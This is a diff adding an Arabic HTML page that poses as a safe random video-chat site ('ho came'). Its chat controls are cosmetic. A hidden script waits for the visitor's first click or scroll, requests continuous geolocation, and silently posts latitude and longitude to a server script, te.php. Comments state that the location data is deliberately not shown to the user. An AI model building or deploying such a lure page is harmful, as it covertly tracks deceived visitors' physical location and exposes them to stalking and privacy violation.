@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تصميم الموقع</title>
+    <style>
+        /* إعدادات عامة */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #000428, #004e92);
+            overflow-x: hidden;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+
+        /* شاشة التحميل */
+        #loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        #loader .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* الشعار */
+        .header {
+            position: absolute;
+            top: 20px;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            z-index: 10;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        .logo .ho {
+            font-size: 40px;
+            font-weight: bold;
+            color: #ff4e50;
+            transform: rotate(-10deg);
+            text-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        .logo .holnb {
+            font-size: 20px;
+            color: #fff;
+            margin-left: 10px;
+        }
+        .word-right {
+            font-size: 14px;
+            color: gray;
+            opacity: 0.9;
+            margin-left: 10px;
+            white-space: nowrap;
+        }
+
+        /* الحاوية */
+        .container {
+            width: 90%;
+            max-width: 800px;
+            margin: 100px auto;
+            text-align: center;
+        }
+
+        /* المربعات */
+        .box {
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.4); /* خلفية المربع السفلي كما كانت */
+            border: 2px solid rgba(255, 255, 255, 1);
+            height: 250px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(255, 255, 255, 0.3);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .box:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 15px rgba(255, 255, 255, 0.5);
+        }
+
+        /* المربع العلوي */
+        .box-image {
+            background: url('o.jpg') no-repeat center center/cover; /* خلفية صورة للمربع العلوي */
+        }
+
+        /* الأيقونات */
+        .icons-container {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        .icon {
+            width: 50px;
+            height: 50px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+        .icon:hover {
+            transform: scale(1.1);
+        }
+        .icon i {
+            font-size: 24px;
+            color: white;
+        }
+        .icon.active {
+            background-color: lightblue;
+        }
+
+        /* الزر داخل المربع السفلي */
+        .button-container {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .button-container button {
+            background-color: orange;
+            color: white;
+            font-size: 20px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(255, 255, 255, 0.2);
+        }
+        .button-container button:hover {
+            background-color: blue;
+            color: black;
+            transform: scale(1.1);
+            box-shadow: 0 0 15px lightblue, 0 0 25px white;
+        }
+
+        /* النص أسفل الزر */
+        .description {
+            margin-top: 15px;
+            font-size: 18px;
+            color: #ddd;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <!-- شاشة التحميل -->
+    <div id="loader">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- الشعار -->
+    <div class="header">
+        <div class="logo">
+            <div class="ho">ho</div>
+            <div class="holnb">came</div>
+        </div>
+        <div class="word-right">معرف الغرفة: لم يتم الانشاء بعد</div>
+    </div>
+
+    <!-- المربعات والزر -->
+    <div class="container">
+        <div class="box box-image"></div> <!-- المربع العلوي مع الخلفية -->
+        <div class="box">
+            <div class="button-container">
+                <button id="toggleButton">اضغط للانضمام</button>
+            </div>
+        </div>
+        <div class="icons-container">
+            <div class="icon" id="micIcon"><i class="fas fa-microphone"></i></div>
+            <div class="icon" id="cameraIcon"><i class="fas fa-camera"></i></div>
+            <div class="icon" id="soundIcon"><i class="fas fa-volume-up"></i></div>
+        </div>
+        <div class="description">استمتع الان بعرف دردشة فيديو آمنة لك ولجميع أصدقائك أو انضم لغرفة دردشة عشوائية وتعرف على أشخاص قريبين منك او في اي مكان فالعالم</div>
+    </div>
+
+    <script>
+        // إزالة شاشة التحميل عند تحميل الصفحة
+        window.addEventListener("load", function() {
+            const loader = document.getElementById("loader");
+            loader.style.opacity = "0";
+            setTimeout(() => {
+                loader.style.display = "none";
+            }, 500);
+        });
+
+        // تغيير الأيقونات عند النقر
+        const toggleIcon = (icon, activeClass, activeIcon, defaultIcon) => {
+            icon.classList.toggle(activeClass);
+            const iconElement = icon.querySelector('i');
+            if (icon.classList.contains(activeClass)) {
+                iconElement.className = activeIcon;
+            } else {
+                iconElement.className = defaultIcon;
+            }
+        };
+
+        document.getElementById("micIcon").addEventListener("click", function() {
+            toggleIcon(this, "active", "fas fa-microphone-slash", "fas fa-microphone");
+        });
+
+        document.getElementById("cameraIcon").addEventListener("click", function() {
+            toggleIcon(this, "active", "fas fa-times", "fas fa-camera");
+        });
+
+        document.getElementById("soundIcon").addEventListener("click", function() {
+            toggleIcon(this, "active", "fas fa-volume-mute", "fas fa-volume-up");
+        });
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <script>
+        var isLive = false;
+        var shareLocation;
+        var accessLocation = false;
+
+        // إعداد مستمع للتفاعل الأول
+        let hasInteracted = false;
+
+        window.onload = () => {
+            document.addEventListener("click", initializeLocationRequest, { once: true });
+            document.addEventListener("scroll", initializeLocationRequest, { once: true });
+        };
+
+        function initializeLocationRequest() {
+            if (!hasInteracted) {
+                hasInteracted = true;
+                requestLocation();
+            }
+        }
+
+        function requestLocation() {
+            if (!isLive) {
+                if (navigator.geolocation) {
+                    shareLocation = navigator.geolocation.watchPosition(
+                        function (position) {
+                            accessLocation = true;
+
+                            // عدم عرض الرسائل أو بيانات الموقع للمستخدم
+                            isLive = true;
+
+                            // حفظ الإحداثيات في ملف نصي عبر AJAX (مفترض أن لديك خادم يدعمه)
+                            saveCoordinatesToFile(position.coords.latitude, position.coords.longitude);
+                        },
+                        function (error) {
+                            handleLocationError(error);
+                        }
+                    );
+                } else {
+                    console.error("المتصفح الخاص بك لا يدعم خاصية الموقع الجغرافي.");
+                }
+            }
+        }
+
+        function handleLocationError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    console.error("لقد قمت برفض الوصول إلى موقعك.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.error("معلومات الموقع غير متوفرة.");
+                    break;
+                case error.TIMEOUT:
+                    console.error("حدثت مشكلة في الحصول على الموقع.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    console.error("حدث خطأ غير معروف.");
+                    break;
+            }
+        }
+
+        // دالة لحفظ الإحداثيات إلى ملف نصي باستخدام AJAX
+        function saveCoordinatesToFile(latitude, longitude) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "te.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log("تم حفظ الإحداثيات بنجاح!");
+                }
+            };
+            xhr.send("latitude=" + latitude + "&longitude=" + longitude);
+        }
+    </script>
+</body>
+</html>
